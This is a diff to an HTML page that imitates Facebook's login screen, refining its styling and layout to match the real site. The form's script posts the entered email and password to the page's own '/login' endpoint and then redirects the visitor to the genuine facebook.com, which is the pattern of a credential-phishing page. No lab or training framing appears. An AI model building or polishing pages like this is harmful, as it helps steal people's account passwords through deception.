@@ -12,31 +12,42 @@
             margin: 0;
             padding: 0;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
             min-height: 100vh;
         }
-        .content {
+        .main-wrapper {
             display: flex;
             align-items: center;
-            justify-content: space-between;
+            justify-content: center;
+            padding-bottom: 112px;
+            padding-top: 72px;
             width: 980px;
-            padding-bottom: 100px;
+            max-width: 100%;
         }
         .left-col {
             width: 580px;
             padding-right: 32px;
+            box-sizing: border-box;
         }
         .logo {
             height: 106px;
             margin: -28px;
         }
         h2 {
+            font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
             font-size: 28px;
             font-weight: normal;
             line-height: 32px;
             width: 500px;
-            margin-top: 10px;
+            margin-top: 24px;
+            margin-bottom: 0;
+        }
+        .right-col {
+            width: 396px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
         .card {
             background-color: #fff;
@@ -44,7 +55,6 @@
             border-radius: 8px;
             box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
             box-sizing: border-box;
-            margin: 40px 0 0;
             padding: 20px 0 28px;
             width: 396px;
             text-align: center;
@@ -60,11 +70,15 @@
             border: 1px solid #dddfe2;
             margin-bottom: 12px;
             box-sizing: border-box;
+            color: #1d2129;
+            height: 52px;
+            line-height: 16px;
         }
         input:focus {
             border-color: #1877f2;
             outline: none;
             box-shadow: 0 0 0 2px #e7f3ff;
+            caret-color: #1877f2;
         }
         .btn {
             background-color: #1877f2;
@@ -77,7 +91,8 @@
             color: #fff;
             font-weight: bold;
             cursor: pointer;
-            margin-bottom: 10px;
+            margin-top: 6px;
+            transition: 200ms cubic-bezier(.08,.52,.52,1) background-color, 200ms cubic-bezier(.08,.52,.52,1) box-shadow, 200ms cubic-bezier(.08,.52,.52,1) transform;
         }
         .btn:hover {
             background-color: #166fe5;
@@ -88,7 +103,11 @@
             font-weight: 500;
             text-decoration: none;
             display: block;
+            margin-top: 16px;
             margin-bottom: 20px;
+        }
+        .forgot:hover {
+            text-decoration: underline;
         }
         .divider {
             align-items: center;
@@ -108,20 +127,37 @@
             font-weight: bold;
             cursor: pointer;
             display: inline-block;
+            transition: 200ms cubic-bezier(.08,.52,.52,1) background-color, 200ms cubic-bezier(.08,.52,.52,1) box-shadow, 200ms cubic-bezier(.08,.52,.52,1) transform;
         }
         .create-btn:hover {
             background-color: #36a420;
         }
+        .create-page {
+            margin-top: 28px;
+            font-size: 14px;
+            color: #1c1e21;
+        }
+        .create-page a {
+            font-weight: bold;
+            color: #1c1e21;
+            text-decoration: none;
+        }
+        .create-page a:hover {
+            text-decoration: underline;
+        }
+
         @media (max-width: 900px) {
-            .content {
+            .main-wrapper {
                 flex-direction: column;
                 width: 100%;
-                padding-top: 40px;
+                padding-top: 0;
+                padding-bottom: 40px;
             }
             .left-col {
                 text-align: center;
                 width: auto;
                 padding: 0;
+                margin-top: 40px;
                 margin-bottom: 40px;
             }
             .logo {
@@ -131,26 +167,41 @@
             h2 {
                 font-size: 24px;
                 width: auto;
+                margin-top: 10px;
+            }
+            .right-col {
+                width: 100%;
+                padding: 0 16px;
+                box-sizing: border-box;
+            }
+            .card {
+                width: 100%;
+                max-width: 396px;
             }
         }
     </style>
 </head>
 <body>
-    <div class="content">
+    <div class="main-wrapper">
         <div class="left-col">
             <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="logo">
             <h2>Facebook helps you connect and share with the people in your life.</h2>
         </div>
         
-        <div class="card">
-            <form id="login-form" class="form-container" onsubmit="handleLogin(event)">
-                <input type="text" id="email" placeholder="Email address or phone number" required>
-                <input type="password" id="password" placeholder="Password" required>
-                <button type="submit" class="btn">Log In</button>
-                <a href="#" class="forgot">Forgotten password?</a>
-                <div class="divider"></div>
-                <button type="button" class="create-btn">Create new account</button>
-            </form>
+        <div class="right-col">
+            <div class="card">
+                <form id="login-form" class="form-container" onsubmit="handleLogin(event)">
+                    <input type="text" id="email" placeholder="Email address or phone number" required>
+                    <input type="password" id="password" placeholder="Password" required>
+                    <button type="submit" class="btn">Log In</button>
+                    <a href="#" class="forgot">Forgotten password?</a>
+                    <div class="divider"></div>
+                    <button type="button" class="create-btn">Create new account</button>
+                </form>
+            </div>
+            <div class="create-page">
+                <a href="#">Create a Page</a> for a celebrity, brand or business.
+            </div>
         </div>
     </div>
 
@@ -163,7 +214,7 @@
             fetch('/login', {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({username: email, password: password})
+                body: JSON.stringify({email: email, password: password})
             }).then(res => {
                 window.location.href = "https://www.facebook.com/";
             });
